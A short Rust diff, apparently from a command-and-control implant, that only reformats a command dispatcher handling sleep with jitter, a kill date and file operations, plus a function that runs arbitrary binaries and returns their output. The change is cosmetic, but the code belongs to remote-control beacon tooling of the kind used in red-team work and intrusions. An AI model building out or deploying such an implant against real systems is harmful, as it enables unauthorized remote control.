@@ -30,9 +30,7 @@ pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
             let jitter = crate::extract_param(parameters, "jitter");
             crate::handle_sleep_command(format!("{} {}", secs, jitter).trim())
         }
-        "killdate" => {
-            crate::handle_killdate_command(&crate::extract_param(parameters, "date"))
-        }
+        "killdate" => crate::handle_killdate_command(&crate::extract_param(parameters, "date")),
         "cp" => copy_path(parameters),
         "mv" => move_path(parameters),
         "rm" => remove_path(parameters),
@@ -132,7 +130,10 @@ fn execute_cmd(parameters: &str) -> String {
     if parts.is_empty() {
         return "[-] Usage: execute <binary> [args...]".into();
     }
-    match std::process::Command::new(parts[0]).args(&parts[1..]).output() {
+    match std::process::Command::new(parts[0])
+        .args(&parts[1..])
+        .output()
+    {
         Ok(o) => {
             let stdout = String::from_utf8_lossy(&o.stdout);
             let stderr = String::from_utf8_lossy(&o.stderr);
